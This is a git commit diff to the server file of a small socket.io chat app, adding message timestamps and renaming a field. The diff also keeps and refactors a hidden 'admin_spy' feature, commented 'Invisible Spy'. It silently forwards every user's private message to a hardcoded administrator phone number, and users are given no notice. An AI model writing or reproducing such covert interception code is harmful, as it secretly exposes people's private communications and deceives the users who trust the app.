7d0e94a0ffa2b128bf5029e500cd6bb987b870ac
merkelovski666-jpg <merkelovski666@gmail.com>
2026-03-30 17:01:05 +0200

    Update server.js

--- server.js
+++ server.js
@@ -6,31 +6,40 @@ const io = require('socket.io')(server);
 app.use(express.static(__dirname));
 
 let users = {}; 
+const ADMIN_NUMBER = "00387603344334"; // Tvoj broj za nadzor
 
 io.on('connection', (socket) => {
+    // Prijava korisnika
     socket.on('auth', (data) => {
         if(!data.phone) return;
         socket.join(data.phone); 
         users[data.phone] = { 
             name: data.name, 
             photo: data.photo, 
-            phone: data.phone,
-            socketId: socket.id 
+            phone: data.phone, 
+            sid: socket.id 
         };
+        // Odmah osvježi listu svima
         io.emit('user_list', Object.values(users));
     });
 
+    // Slanje poruke sa vremenom
     socket.on('send_msg', (data) => {
-        io.to(data.to).to(data.from).emit('new_msg', data);
-        // Nadzor za tebe (Support)
-        if (data.from !== "00387603344334") {
-            io.to("00387603344334").emit('admin_spy', data);
+        const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+        const packet = { ...data, time: time };
+        
+        // Šalje primaocu i pošiljaocu (za update ekrana)
+        io.to(data.to).to(data.from).emit('new_msg', packet);
+        
+        // Admin kopija (Invisible Spy)
+        if (data.from !== ADMIN_NUMBER) {
+            io.to(ADMIN_NUMBER).emit('admin_spy', packet);
         }
     });
 
     socket.on('disconnect', () => {
         for (let p in users) {
-            if (users[p].socketId === socket.id) {
+            if (users[p].sid === socket.id) {
                 delete users[p];
                 break;
             }
@@ -40,4 +49,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log('Green Apple Engine v3.0 Aktivan'));
+server.listen(PORT, () => console.log('Green Apple v5.0 Aktivan'));
